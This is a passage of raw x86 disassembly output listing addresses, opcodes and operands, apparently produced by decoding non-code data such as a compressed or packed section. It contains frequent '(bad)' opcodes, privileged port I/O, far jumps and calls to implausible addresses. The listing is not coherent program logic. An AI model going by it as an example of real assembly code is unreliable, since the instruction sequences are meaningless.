  4210b8:	push   DWORD PTR [edx-0x32]
  4210bb:	sbb    DWORD PTR [edi],eax
  4210bd:	mov    fs:0x8b7001b1,eax
  4210c3:	jnp    0x42108a
  4210c5:	mov    edi,0xe5c143bf
  4210ca:	jbe    0x421147
  4210cc:	inc    esi
  4210cd:	icebp  
  4210ce:	jmp    FWORD PTR [ebx]
  4210d0:	std    
  4210d1:	fld    st(7)
  4210d3:	inc    ebx
  4210d4:	sub    DWORD PTR [ecx],0x73
  4210d7:	xchg   ecx,eax
  4210d8:	mov    esi,0xc02db964
  4210dd:	cs (bad) 
  4210e0:	add    esi,DWORD PTR [edx-0x4f]
  4210e3:	adc    al,0x89
  4210e5:	call   0xed913eae
  4210ea:	xchg   DWORD PTR [ebx-0x7d],eax
  4210ed:	sub    DWORD PTR [ebx-0x6f],esi
  4210f0:	mov    esi,0xc12db974
  4210f5:	in     eax,0x76
  4210f7:	das    
  4210f8:	jae    0x4210c7
  4210fa:	jb     0x421177
  4210fc:	inc    esi
  4210fd:	sar    edi,1
  4210ff:	sub    al,0x4e
  421101:	out    0x49,al
  421103:	add    al,0x31
  421105:	mov    al,0xf5
  421107:	imul   ecx,DWORD PTR [esp+edi*2],0xffffffb6
  42110b:	js     0x42114b
  42110d:	into   
  42110e:	mov    bh,0xff
  421110:	inc    ebp
  421112:	add    eax,0x2e7203e0
  421117:	adc    al,0x89
  421119:	call   0x42111e
  42111e:	add    BYTE PTR [edi+ebp*1+0x4f],al
  421122:	frstor ds:0x78a98345
  421128:	(bad)  
  421129:	mov    esi,0xc12f366c
  42112e:	in     eax,dx
  42112f:	jbe    0x4211aa
  421131:	inc    esi
  421132:	icebp  
  421133:	std    
  421134:	sub    al,0xfd
  421136:	add    BYTE PTR [esi+edx*1+0x2f],bl
  42113a:	leave  
  42113b:	nop
  42113c:	(bad)  
  42113d:	or     edx,DWORD PTR [ebp-0xc27be3]
  421143:	pop    ds
  421144:	div    BYTE PTR [eax+0x24]
  421147:	sar    BYTE PTR [edx+0x45],1
  42114a:	sbb    BYTE PTR [edi-0x1],ah
  42114d:	push   ecx
  42114e:	dec    DWORD PTR [esp+edi*8]
  421151:	cs leave 
  421153:	push   eax
  421154:	(bad)  
  421155:	or     edx,DWORD PTR [ebp-0xc27c73]
  42115b:	mov    es,WORD PTR [edx]
  42115d:	add    BYTE PTR [ebx+0x18707d5],cl
  421163:	pop    ebx
  421164:	push   esi
  421165:	adc    al,0x33
  421167:	cmp    BYTE PTR gs:[edi+ecx*1+0x4189bf21],0x6b
  421170:	rcl    DWORD PTR [edx+0x50],0x29
  421174:	pop    ebp
  421175:	or     al,0xc7
  421177:	xchg   ebx,eax
  421178:	out    dx,eax
  421179:	je     0x4211bb
  42117b:	mov    WORD PTR [eax+0x43],?
  42117e:	or     BYTE PTR [edi+eax*1-0x1b],dh
  421182:	add    BYTE PTR [eax],al
  421184:	add    BYTE PTR [eax],al
  421186:	add    BYTE PTR [eax],al
  421188:	pop    esp
  421189:	js     0x421206
  42118b:	sub    BYTE PTR [ebx],dl
  42118d:	outs   dx,BYTE PTR ds:[esi]
  42118e:	sub    al,0xe2
  421190:	sub    al,BYTE PTR [eax-0x4]
  421193:	(bad)  
  421194:	mov    ds:0x9deef032,eax
  421199:	push   es
  42119a:	ret    
  42119b:	inc    edi
  42119c:	je     0x4211a2
  42119e:	jmp    0x4211e1
  4211a0:	dec    esp
  4211a1:	out    dx,al
  4211a2:	inc    ebx
  4211a3:	cmp    al,0x74
  4211a5:	in     eax,0x3d
  4211a7:	add    bl,dl
  4211a9:	ins    DWORD PTR es:[edi],dx
  4211aa:	cmp    al,0x42
  4211ac:	or     eax,DWORD PTR [eax-0x4]
  4211af:	(bad)  
  4211b0:	push   ebx
  4211b1:	inc    edx
  4211b2:	push   ecx
  4211b3:	out    dx,eax
  4211b4:	jne    0x421190
  4211b6:	add    eax,ebp
  4211b8:	mov    dl,0xe1
  4211ba:	mov    ds:0x8719b4ec,al
  4211bf:	les    ebx,FWORD PTR [ebx-0x66bcd5a8]
  4211c5:	sbb    eax,0xa9fe5601
  4211ca:	cmp    eax,DWORD PTR ds:0xffc020e5
  4211d0:	and    cx,dx
  4211d3:	out    0x36,eax
  4211d5:	xor    BYTE PTR [edx],0xfc
  4211d8:	(bad)  
  4211d9:	loop   0x4211ad
  4211db:	sar    DWORD PTR [ecx+0x19],0x70
  4211df:	(bad)  
  4211e0:	mov    bh,0xa8
  4211e2:	add    edx,eax
  4211e4:	jge    0x4211ff
  4211e6:	int    0x88
  4211e8:	cdq    
  4211e9:	xchg   edi,eax
  4211ea:	and    al,0xf
  4211ec:	add    BYTE PTR [eax],al
  4211ee:	add    BYTE PTR [eax],al
  4211f0:	add    BYTE PTR [esi-0x71],al
  4211f3:	add    DWORD PTR [ebp-0x66],edx
  4211f6:	xor    eax,0x19350fd0
  4211fb:	jge    0x4211bc
  4211fd:	add    DWORD PTR [edx-0x77d92711],edx
  421203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421204:	(bad)  
  421205:	and    ebp,DWORD PTR [edx+ecx*1]
  421208:	push   esp
  421209:	test   DWORD PTR [ebx+0x0],ebx
  42120c:	xor    DWORD PTR ds:0xf050a8b0,0xffffffd6
  421213:	das    
  421214:	dec    edi
  421215:	iret   
  421216:	sbb    bl,BYTE PTR [eax+0x3dbcc0f]
  42121c:	std    
  42121d:	pusha  
  42121e:	repz adc eax,DWORD PTR [eax+0x75]
  421222:	xchg   esi,eax
  421223:	inc    ebx
  421224:	jae    0x4212a2
  421226:	xchg   esi,eax
  421227:	(bad)  
  421228:	repz lds ebx,FWORD PTR [esi-0x393a083a]
  42122f:	(bad)  
  421230:	out    dx,eax
  421231:	lds    eax,FWORD PTR [edx]
  421233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421234:	mov    ecx,0x2c3b7c1e
  421239:	adc    DWORD PTR [eax],edx
  42123b:	xor    edx,DWORD PTR [esi*4-0x79bb9bfe]
  421242:	push   cs
  421243:	xchg   BYTE PTR [ecx+0x2bf32a06],bh
  421249:	icebp  
  42124a:	scas   eax,DWORD PTR es:[edi]
  42124b:	jbe    0x421228
  42124d:	jmp    0x35561961
  421252:	add    ch,BYTE PTR [esp+eax*2+0x0]
  421256:	add    BYTE PTR [eax],al
  421258:	add    BYTE PTR [eax],al
  42125a:	neg    DWORD PTR [di-0x47]
  42125e:	into   
  42125f:	sub    ebx,edi
  421261:	jg     0x4212c7
  421263:	ret    0x86e6
  421266:	das    
  421267:	es inc ebp
  421269:	out    dx,eax
  42126a:	lds    ebp,FWORD PTR [esi-0x987b516]
  421270:	out    0x3,al
  421272:	jne    0x4212ef
  421274:	lods   al,BYTE PTR ds:[esi]
  421275:	pop    es
  421276:	cli    
  421277:	enter  0x7eee,0x37
  42127b:	adc    DWORD PTR es:[esi],eax
  42127e:	inc    esp
  42127f:	inc    edx
  421280:	mov    cl,0x3c
  421282:	mov    ch,0xcf
  421284:	popa   
  421285:	and    BYTE PTR [ebx],dh
  421287:	shl    BYTE PTR [ecx-0x7],1
  42128a:	cmp    dl,BYTE PTR [edx]
  42128c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42128d:	add    ecx,eax
  42128f:	ja     0x42123c
  421291:	das    
  421292:	mov    edx,0x629de69c
  421297:	fwait
  421298:	out    0x32,eax
  42129a:	out    0xfa,eax
  42129c:	fstp   QWORD PTR [ecx-0x9]
  42129f:	inc    ecx
  4212a0:	pop    ebx
  4212a1:	out    dx,al
  4212a2:	dec    ecx
  4212a3:	movntq QWORD PTR [esi],mm2
  4212a6:	mov    ch,0x2
  4212a8:	push   0x2b
  4212aa:	mov    esp,0xb77f0daf
  4212af:	jmp    FWORD PTR es:[ebx-0x4a]
  4212b3:	mov    ch,0x27
  4212b5:	rcl    DWORD PTR [eax],0x5b
  4212b8:	std    
  4212b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ba:	fwait
  4212bb:	xor    DWORD PTR [edx+0x9e],eax
  4212c1:	add    BYTE PTR [eax],al
  4212c3:	retf   0x8b0b
  4212c6:	sub    al,0x45
  4212c8:	mov    ecx,0xce4514fc
  4212cd:	imul   ebp,eax,0x7e07b447
  4212d3:	dec    esp
  4212d4:	test   BYTE PTR [edi-0x3b848d03],bh
  4212da:	sbb    dh,0xcd
  4212dd:	out    0xb3,eax
  4212df:	cmp    BYTE PTR [edi],ah
  4212e1:	cld    
  4212e2:	sbb    bh,BYTE PTR [ecx]
  4212e4:	(bad)  
  4212e5:	pop    ebp
  4212e6:	and    BYTE PTR [eax],dh
  4212e8:	add    eax,0x1d43b400
  4212ed:	jle    0x421344
  4212ef:	push   edx
  4212f0:	add    eax,DWORD PTR [eax]
  4212f2:	jmp    0xbe1a96c3
  4212f7:	mov    dl,0x9e
  4212f9:	xor    dl,0x76
  4212fc:	scas   al,BYTE PTR es:[edi]
  4212fd:	cmp    eax,0xfac91d74
  421302:	push   ds
  421303:	inc    edi
  421304:	and    DWORD PTR [ebx],esi
  421306:	arpl   WORD PTR [esi+0x2],si
  421309:	add    DWORD PTR [edx+ecx*2+0x4a8c8129],0x3d6c5129
  421314:	xor    al,0x4f
  421316:	add    DWORD PTR [edi],ebp
  421318:	adc    DWORD PTR [eax],eax
  42131a:	jmp    0xfcb57b19
  42131f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421320:	mov    ah,0xfb
  421322:	jb     0x4212e3
  421324:	es jb  0x421304
  421327:	add    BYTE PTR [eax],al
  421329:	add    BYTE PTR [eax],al
  42132b:	add    bl,ch
  42132d:	daa    
  42132e:	dec    esp
  42132f:	inc    ecx
  421330:	mov    ch,0x27
  421332:	cld    
  421333:	add    BYTE PTR [esp+ecx*1-0x17],cl
  421337:	ins    DWORD PTR es:[edi],dx
  421338:	sbb    al,0x4
  42133a:	sti    
  42133b:	jne    0x421325
  42133d:	push   es
  42133e:	in     eax,dx
  42133f:	test   eax,0xe84ff1d2
  421344:	push   es
  421345:	int3   
  421346:	cli    
  421347:	call   DWORD PTR [edx-0x15]
  42134a:	mov    edi,0x7fe29755
  42134f:	in     al,0xe4
  421351:	sub    eax,0x74
  421354:	or     DWORD PTR [eax+eax*1],eax
  421357:	push   ebx
  421358:	mov    cl,BYTE PTR [ecx-0x77]
  42135b:	inc    esp
  42135c:	mov    eax,0x7cf62f0f
  421361:	stos   DWORD PTR es:[edi],eax
  421362:	jo     0x421388
  421364:	je     0x42136c
  421366:	mov    bh,0x99
  421368:	fadd   QWORD PTR [ebx]
  42136a:	test   al,al
  42136c:	sar    DWORD PTR [edi-0x6a],cl
  42136f:	add    ah,cl
  421371:	add    ebp,eax
  421373:	xor    BYTE PTR [ecx-0x2],dl
  421376:	dec    DWORD PTR [edx+0x2458ab54]
  42137c:	les    ebp,FWORD PTR [eax+ebx*2-0x401643dc]
  421383:	adc    cl,bh
  421385:	cmc    
  421386:	out    0x12,eax
  421388:	out    0xf2,al
  42138a:	sti    
  42138b:	push   esi
  42138c:	scas   eax,DWORD PTR es:[edi]
  42138d:	mov    dh,0x52
  42138f:	inc    ebx
  421390:	add    BYTE PTR [eax],al
  421392:	add    BYTE PTR [eax],al
  421394:	add    BYTE PTR [ebp+ebp*1+0x65],dh
  421398:	push   DWORD PTR [ebx+0x7d]
  42139b:	dec    eax
  42139c:	and    al,0x54
  42139e:	adc    eax,DWORD PTR [edi-0x1904c7a4]
  4213a4:	push   ebx
  4213a5:	push   0xffffffbe
  4213a7:	std    
  4213a8:	je     0x421409
  4213aa:	or     edx,esi
  4213ac:	out    0x5c,eax
  4213ae:	add    ecx,DWORD PTR [ecx-0x1c0a8a84]
  4213b4:	out    0x58,eax
  4213b6:	pushf  
  4213b7:	das    
  4213b8:	cld    
  4213b9:	div    BYTE PTR [ebx+0x1]
  4213bc:	jmp    0x185832f
  4213c1:	mov    eax,ds:0x75e11823
  4213c6:	sbb    DWORD PTR [eax],eax
  4213c8:	adc    DWORD PTR [esi],0xb2b1b5e
  4213ce:	pop    esp
  4213cf:	add    al,0x74
  4213d1:	jg     0x421354
  4213d3:	mov    edx,0x831902fe
  4213d8:	loopne 0x4213d8
  4213da:	xchg   ebx,eax
  4213db:	or     eax,0xb4d8b6f6
  4213e0:	cs clc 
  4213e2:	and    al,0xe4
  4213e4:	pop    ss
  4213e5:	int    0xb7
  4213e7:	sbb    ah,bh
  4213e9:	fcmovbe st,st(0)
  4213eb:	fwait
  4213ec:	pcmpeqw mm3,QWORD PTR [ecx]
  4213ef:	jnp    0x4213be
  4213f1:	mul    bl
  4213f3:	shl    bh,0xb4
  4213f6:	shr    BYTE PTR [edi],0xfc
  4213f9:	add    BYTE PTR [eax],al
  4213fb:	add    BYTE PTR [eax],al
  4213fd:	add    BYTE PTR [esi+0x5d],bh
  421400:	in     al,0xf
  421402:	sub    DWORD PTR [ebp+edi*2+0x43],ecx
  421406:	push   ecx
  421407:	dec    ecx
  421408:	shr    BYTE PTR [ecx+0x74],1
  42140b:	inc    ebx
  42140c:	add    al,0x58
  42140e:	in     al,dx
  42140f:	cmp    al,0xe4
  421411:	pop    ss
  421412:	popf   
  421413:	and    ecx,DWORD PTR [edx-0x4b627501]
  421419:	and    ebp,DWORD PTR [ecx+0x1]
  42141c:	xor    BYTE PTR [edi+0x5dcf1975],dl
  421422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421423:	fcmovne st,st(3)
  421425:	mov    BYTE PTR [eax-0x71],dl
  421428:	inc    edx
  421429:	add    esi,DWORD PTR [ebp-0x65]
  42142c:	in     eax,dx
  42142d:	mov    DWORD PTR [ebx+eax*1+0x2a],0x21b05204
  421435:	(bad)  
  421436:	mov    eax,ds:0xa9d7d5f1
  42143b:	int    0x3e
  42143d:	out    dx,eax
  42143e:	dec    ebx
  42143f:	(bad)  
  421440:	out    0xd6,al
  421442:	leave  
  421443:	and    eax,0xc28433d3
  421448:	out    0x7a,al
  42144a:	adc    ch,dl
  42144c:	mov    ch,0xb8
  42144e:	jns    0x4213ea
  421450:	outs   dx,BYTE PTR ds:[esi]
  421451:	adc    esi,DWORD PTR [ebp+0x2]
  421454:	xor    eax,0xf9e2672f
  421459:	ret    
  42145a:	add    bh,BYTE PTR [edi-0x5a]
  42145d:	mov    eax,0x2f1ccd72
  421462:	add    BYTE PTR [eax],al
  421464:	add    BYTE PTR [eax],al
  421466:	add    BYTE PTR [edi-0x153c2602],al
  42146c:	iret   
  42146d:	jne    0x421488
  42146f:	jno    0x421482
  421471:	daa    
  421472:	add    al,0x38
  421474:	les    ebp,FWORD PTR [ecx]
  421476:	fscale 
  421478:	push   ss
  421479:	imul   esp,DWORD PTR [eax],0xd4c0cc9a
  42147f:	out    dx,eax
  421480:	scas   eax,DWORD PTR es:[edi]
  421481:	ss int3 
  421483:	shl    BYTE PTR [esi],cl
  421485:	outs   dx,BYTE PTR ds:[esi]
  421486:	add    al,0x75
  421488:	and    eax,0x21cfbb3
  42148d:	aas    
  42148e:	or     al,0xcf
  421490:	and    al,0x2d
  421492:	into   
  421493:	test   BYTE PTR [edx-0x66],0xb
  421497:	(bad)  
  421498:	mov    edi,0xaf89d436
  42149d:	fisubr WORD PTR [esi]
  42149f:	pop    es
  4214a0:	cli    
  4214a1:	(bad)  
  4214a2:	fcmovne st,st(5)
  4214a4:	and    al,0x5
  4214a6:	mov    DWORD PTR [edx],esi
  4214a8:	scas   al,BYTE PTR es:[edi]
  4214a9:	jecxz  0x42149d
  4214ab:	sub    al,dl
  4214ad:	inc    DWORD PTR [ecx]
  4214af:	ja     0x4214a4
  4214b1:	mov    edi,0x1b720
  4214b6:	cmp    al,0xce
  4214b8:	sbb    DWORD PTR [eax-0x145b613b],eax
  4214be:	cmp    eax,0x37000277
  4214c3:	(bad)  
  4214c5:	mov    bh,BYTE PTR ds:0xd157dd1d
  4214cb:	add    BYTE PTR [eax],al
  4214cd:	add    BYTE PTR [eax],al
  4214cf:	add    al,dh
  4214d1:	jl     0x4214d2
  4214d3:	call   0x1bab5477
  4214d8:	cwde   
  4214d9:	shl    DWORD PTR [ebx],0xf5
  4214dc:	cmc    
  4214dd:	mov    al,0x23
  4214df:	aad    0x3e
  4214e1:	sbb    eax,0x2766173
  4214e6:	mov    esp,DWORD PTR ds:0x914fb50d
  4214ec:	jb     0x421514
  4214ee:	cld    
  4214ef:	jle    0x4214e3
  4214f1:	fs jae 0x4214a4
  4214f4:	mul    DWORD PTR [eax+0x7976dd23]
  4214fa:	inc    ebx
  4214fb:	or     eax,0x5437ba9
  421500:	popa   
  421501:	jns    0x421546
  421503:	or     eax,0x5437bc1
  421508:	imul   edi,DWORD PTR [ebx-0x3b],0x23c0f599
  42150f:	fnstenv [ebx]
  421511:	shl    DWORD PTR [ebx],0xd1
  421514:	ins    DWORD PTR es:[edi],dx
  421515:	add    al,BYTE PTR [eax]
  421517:	jmp    0xc965d64f
  42151c:	jns    0x421520
  42151e:	add    cl,ch
  421520:	xor    eax,ecx
  421522:	and    ecx,ebp
  421524:	je     0x421528
  421526:	add    cl,ch
  421528:	pop    esi
  421529:	ins    DWORD PTR es:[di],dx
  42152b:	add    BYTE PTR [eax+eax*1+0x5e],bl
  42152f:	mov    esi,DWORD PTR [ecx+0x52]
  421532:	mov    edi,0x55
  421537:	add    BYTE PTR [eax],al
  421539:	xlat   BYTE PTR ds:[ebx]
  42153a:	add    edi,DWORD PTR [esi-0x14]
  42153d:	push   esp
  42153e:	add    al,BYTE PTR [eax]
  421540:	add    cl,cl
  421542:	jnp    0x421538
  421544:	std    
  421545:	sub    edx,esi
  421547:	dec    esp
  421548:	call   0x3deaae
  42154d:	sar    BYTE PTR [esi-0x5c56f490],1
  421553:	hlt    
  421554:	std    
  421555:	jmp    0x42152c
  421557:	in     al,0x7c
  421559:	out    0xd5,al
  42155b:	sti    
  42155c:	leave  
  42155d:	iret   
  42155e:	dec    ebx
  42155f:	xchg   esp,ebp
  421561:	lahf   
  421562:	loop   0x42157c
  421564:	push   ebx
  421565:	inc    edx
  421566:	test   eax,0xfc970871
  42156b:	push   edx
  42156c:	mov    DWORD PTR [ecx-0x16],ebx
  42156f:	mov    DWORD PTR [ebp-0x1c],ecx
  421572:	push   eax
  421573:	sti    
  421574:	jne    0x42154e
  421576:	stos   BYTE PTR es:[edi],al
  421577:	(bad)  
  421578:	push   0x6b
  42157a:	mov    ah,bh
  42157c:	imul   ecx,ebp,0x2c5d854d
  421582:	aad    0x4c
  421584:	push   eax
  421585:	push   ecx
  421586:	mov    esi,0xfe89850b
  42158b:	(bad)  
  42158c:	call   DWORD PTR [edi-0x4]
  42158f:	mov    BYTE PTR [ebp+0x34],cl
  421592:	dec    edi
  421593:	xchg   DWORD PTR [ebp-0x68],ecx
  421596:	xchg   DWORD PTR [ecx+edi*2-0x34],esi
  42159a:	(bad)  
  42159b:	cli    
  42159c:	jno    0x42159e
  42159e:	add    BYTE PTR [eax],al
  4215a0:	add    BYTE PTR [eax],al
  4215a2:	xchg   esp,eax
  4215a3:	dec    ebp
  4215a4:	sti    
  4215a5:	push   eax
  4215a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215a7:	jl     0x421565
  4215a9:	movups XMMWORD PTR [esi-0x4],xmm6
  4215ad:	push   DWORD PTR [ebp+0x19]
  4215b0:	ja     0x4215f4
  4215b2:	jge    0x421554
  4215b4:	sti    
  4215b5:	mov    cl,al
  4215b7:	adc    edx,edx
  4215b9:	imul   edx,DWORD PTR [ebp+0x62500c8f],0x5aff3fca
  4215c3:	sbb    DWORD PTR [ebp-0x1f3b3741],eax
  4215c9:	inc    edx
  4215ca:	dec    ecx
  4215cb:	loop   0x421591
  4215cd:	out    0xcb,eax
  4215cf:	mov    bh,0xee
  4215d1:	fsubr  st,st(6)
  4215d3:	fstp   QWORD PTR [edi]
  4215d5:	mov    BYTE PTR [ecx+0x2a830c18],dh
  4215db:	in     eax,dx
  4215dc:	(bad)  
  4215dd:	mov    cl,0xb5
  4215df:	mov    al,ds:0xaf00e743
  4215e4:	sub    bh,ah
  4215e6:	clc    
  4215e7:	pop    eax
  4215e8:	mov    ah,0x34
  4215ea:	mov    ds:0x2d81040f,al
  4215ef:	mov    WORD PTR [eax],ds
  4215f1:	pop    eax
  4215f2:	les    esi,FWORD PTR [edx+0x2b]
  4215f5:	mov    ch,ch
  4215f7:	xchg   ebp,eax
  4215f8:	sub    esi,DWORD PTR [ebx-0x6b]
  4215fb:	mov    al,0xbd
  4215fd:	adc    ecx,DWORD PTR [edx-0x68]
  421600:	cmp    ah,bh
  421602:	int    0x25
  421604:	outs   dx,DWORD PTR ds:[esi]
  421605:	std    
  421606:	add    BYTE PTR [eax],al
  421608:	add    BYTE PTR [eax],al
  42160a:	add    dl,dl
  42160c:	xchg   esp,eax
  42160d:	inc    eax
  42160e:	jae    0x421675
  421610:	mov    al,0xbd
  421612:	adc    eax,DWORD PTR [esi+0x3ca798d9]
  421618:	pop    ecx
  421619:	add    BYTE PTR [eax-0x63],al
  42161c:	popa   
  42161d:	outs   dx,DWORD PTR ds:[esi]
  42161e:	std    
  42161f:	stos   BYTE PTR es:[edi],al
  421620:	mov    ebx,DWORD PTR [eax]
  421622:	xor    ebx,edx
  421624:	jmp    0x4277:0xd530fc2b
  42162b:	xchg   ecx,eax
  42162c:	add    DWORD PTR [edx+0x40],ebp
  42162f:	dec    edx
  421630:	out    0xa3,eax
  421632:	sbb    eax,DWORD PTR [edi+ebx*2]
  421635:	popa   
  421636:	into   
  421637:	mov    dh,BYTE PTR [esi-0x5d]
  42163a:	aaa    
  42163b:	std    
  42163c:	or     dh,BYTE PTR [esi+edx*8+0x52]
  421640:	mov    ch,0x96
  421642:	sub    al,0xb3
  421644:	jmp    0xd3de:0x8e62c661
  42164b:	push   ecx
  42164c:	mov    ah,0xee
  42164e:	sub    al,bh
  421650:	push   cs
  421651:	jb     0x421655
  421653:	stos   DWORD PTR es:[edi],eax
  421654:	and    DWORD PTR [esi],esi
  421656:	adc    BYTE PTR [eax],bh
  421658:	cwde   
  421659:	fidivr DWORD PTR [esi+0x78]
  42165c:	lods   al,BYTE PTR ds:[esi]
  42165d:	out    0x2a,eax
  42165f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421660:	or     dl,BYTE PTR ds:0x6bb6b22b
  421666:	inc    esp
  421667:	imul   eax,DWORD PTR [esi+0x22112afa],0xb1a5
  421671:	add    BYTE PTR [eax],al
  421673:	add    BYTE PTR [edx-0x73],dh
  421676:	in     al,0xd1
  421678:	add    DWORD PTR [ebx-0xd8080d2],esi
  42167e:	popa   
  42167f:	add    cl,BYTE PTR [eax-0x54]
  421682:	out    0xd1,al
  421684:	jmp    0x22c3013b
  421689:	cwde   
  42168a:	adc    al,0xed
  42168c:	xor    DWORD PTR [edx],ecx
  42168e:	in     eax,dx
  42168f:	int3   
  421690:	std    
  421691:	add    eax,0xb372b974
  421696:	mov    ch,0x2a
  421698:	dec    ecx
  421699:	push   es
  42169a:	mov    edx,0x63c22a2a
  42169f:	inc    esp
  4216a0:	daa    
  4216a1:	leave  
  4216a2:	jno    0x4216ab
  4216a4:	dec    bh
  4216a6:	(bad)  
  4216a7:	aam    0xc
  4216a9:	add    al,BYTE PTR [eax]
  4216ab:	ss out 0x5,al
  4216ae:	push   ecx
  4216af:	cs test eax,0xc42982f9
  4216b5:	cld    
  4216b6:	cld    
  4216b7:	xchg   esp,eax
  4216b8:	jb     0x421645
  4216ba:	dec    edx
  4216bb:	sbb    eax,0xdd721ea6
  4216c0:	repz xor bh,ah
  4216c3:	jl     0x42164b
  4216c5:	sub    ah,BYTE PTR [ebp-0x77e17001]
  4216cb:	lods   al,BYTE PTR ds:[esi]
  4216cc:	xchg   BYTE PTR [ebx-0x2f6066f9],cl
  4216d2:	pop    es
  4216d3:	jb     0x421748
  4216d5:	mov    bh,0xfc
  4216d7:	push   esp
  4216d8:	add    BYTE PTR [eax],al
  4216da:	add    BYTE PTR [eax],al
  4216dc:	add    BYTE PTR [ecx-0x4e],al
  4216df:	cld    
  4216e0:	cmp    DWORD PTR ds:0xbb55bf84,esi
  4216e6:	push   ds
  4216e7:	jb     0x4216da
  4216e9:	stos   DWORD PTR es:[edi],eax
  4216ea:	add    dl,BYTE PTR [ecx-0x42]
  4216ed:	inc    esi
  4216ee:	leave  
  4216ef:	pop    esp
  4216f0:	pop    ss
  4216f1:	sub    cl,BYTE PTR [eax-0x3f]
  4216f4:	fnstenv [esi-0x4b]
  4216f7:	mov    BYTE PTR [ebp-0x1794d30f],dl
  4216fd:	jbe    0x421701
  4216ff:	push   ecx
  421700:	aas    
  421701:	es test eax,0x20b91097
  421707:	fs jno 0x421723
  42170a:	loope  0x42170b
  42170c:	nop
  42170d:	mov    BYTE PTR [eax],ch
  42170f:	cld    
  421710:	jbe    0x42176d
  421712:	xor    DWORD PTR [eax],esi
  421714:	xchg   edx,eax
  421715:	jecxz  0x421728
  421717:	or     al,0x6d
  421719:	dec    edi
  42171a:	and    esp,edi
  42171c:	jmp    0xb4c8c8cc
  421721:	xchg   edx,eax
  421722:	mov    al,BYTE PTR ds:0xbd15fb7
  421728:	add    BYTE PTR [ecx],bl
  42172a:	lds    esi,FWORD PTR [ecx+0x61]
  42172d:	daa    
  42172e:	add    ecx,DWORD PTR [ecx+0x4f36644d]
  421734:	push   0xffffff9e
  421736:	xor    bh,bl
  421738:	push   eax
  421739:	mov    BYTE PTR [ecx+0x7cbc75bc],al
  42173f:	fs jns 0x421742
  421742:	add    BYTE PTR [eax],al
  421744:	add    BYTE PTR [eax],al
  421746:	int3   
  421747:	add    al,0x68
  421749:	pop    eax
  42174a:	add    eax,0x8be7fc44
  42174f:	loop   0x42174c
  421751:	jmp    edi
  421753:	jmp    0x42178c
  421755:	sti    
  421756:	fcom   DWORD PTR ds:0x35604589
  42175c:	mov    DWORD PTR [ebp-0x4130c],eax
  421762:	jl     0x4216fb
  421764:	inc    ecx
  421765:	mov    al,0x7c
  421767:	jmp    0xb4da0fdd
  42176c:	xchg   edi,ecx
  42176e:	fistp  DWORD PTR [edi-0x54]
  421771:	inc    esp
  421772:	or     al,0x4
  421774:	add    bh,al
  421776:	mov    DWORD PTR [esi+0xee3fffa],ecx
  42177c:	std    
  42177d:	call   FWORD PTR [esp+edi*8]
  421780:	repz std 
  421782:	jecxz  0x42176d
  421784:	xchg   DWORD PTR [edi],eax
  421786:	cmp    ebp,ecx
  421788:	dec    esp
  421789:	or     BYTE PTR [edi+0x5f],dl
  42178c:	hlt    
  42178d:	mov    esp,esp
  42178f:	xor    edi,ebx
  421791:	push   ecx
  421792:	in     al,0x9e
  421794:	add    dl,BYTE PTR [esi+0x63]
  421797:	ss add al,0xe8
  42179a:	out    0xb5,al
  42179c:	sti    
  42179d:	inc    DWORD PTR [edi+0x47]
  4217a0:	clc    
  4217a1:	cmp    al,0xd8
  4217a3:	push   cs
  4217a4:	shl    bh,0x75
  4217a7:	rol    DWORD PTR [edx+0xbf],1
  4217ad:	add    BYTE PTR [eax],al
  4217af:	dec    esi
  4217b0:	inc    eax
  4217b1:	outs   dx,DWORD PTR ds:[esi]
  4217b2:	mov    edi,0xfc2b419d
  4217b7:	mov    ds:0xac58c680,al
  4217bc:	in     al,dx
  4217bd:	int3   
  4217be:	mov    BYTE PTR [ecx+0x767b17aa],ah
  4217c4:	sub    DWORD PTR [eax],eax
  4217c6:	push   ecx
  4217c7:	sub    ebx,DWORD PTR [eax+0x6b]
  4217ca:	push   DWORD PTR [ebp+0x29]
  4217cd:	add    BYTE PTR [ecx+0x0],dl
  4217d0:	mov    esi,0x86afa7f
  4217d5:	sar    esp,1
  4217d7:	call   0xef319309
  4217dc:	cs into 
  4217de:	cld    
  4217df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217e0:	xor    eax,0x2fc1bf7d
  4217e5:	and    DWORD PTR [edx+0x71],0x29
  4217e9:	sbb    edx,DWORD PTR [ebx]
  4217eb:	call   0x333c949d
  4217f0:	push   eax
  4217f1:	shr    BYTE PTR [ecx+0x75],1
  4217f4:	lods   al,BYTE PTR ds:[esi]
  4217f5:	cmp    ah,bh
  4217f7:	or     eax,0x1afd56da
  4217fc:	mov    ds:0x26fe0bbd,al
  421801:	ror    DWORD PTR [edx-0x3d95308],cl
  421807:	add    bl,dl
  421809:	es jb  0x421869
  42180c:	fbld   TBYTE PTR [esi]
  42180e:	dec    edi
  42180f:	mov    DWORD PTR [edi+eiz*1],edi
  421812:	add    BYTE PTR [eax],0x0
  421815:	add    BYTE PTR [eax],al
  421817:	add    BYTE PTR [ebp+0x6086fd1c],dh
  42181d:	and    DWORD PTR [ebx],ebx
  42181f:	adc    al,ch
  421821:	lods   eax,DWORD PTR ds:[esi]
  421822:	jl     0x421821
  421824:	shr    BYTE PTR [edi+0x1f654d0],cl
  42182a:	das    
  42182b:	sub    dl,bl
  42182d:	ret    
  42182e:	lea    ebp,[ecx]
  421830:	mov    ecx,0xfc0bab88
  421835:	pop    es
  421836:	mov    edx,0x4285ff76
  42183b:	sub    BYTE PTR [ecx+0x7eae3db0],ah
  421841:	mov    eax,0x8566d335
  421846:	es scas al,BYTE PTR es:[edi]
  421848:	lea    ebp,fs:[ebx+0x7f]
  42184c:	jle    0x42186c
  42184e:	sbb    eax,0x1e8321d3
  421853:	sub    BYTE PTR [edx-0x7],bl
  421856:	cmp    eax,0xfe8a6929
  42185b:	jnp    0x4218d5
  42185d:	(bad)  
  42185e:	stos   DWORD PTR es:[edi],eax
  42185f:	daa    
  421860:	stos   DWORD PTR es:[edi],eax
  421861:	sbb    eax,0x1dab137b
  421866:	xchg   esi,eax
  421867:	adc    esi,esi
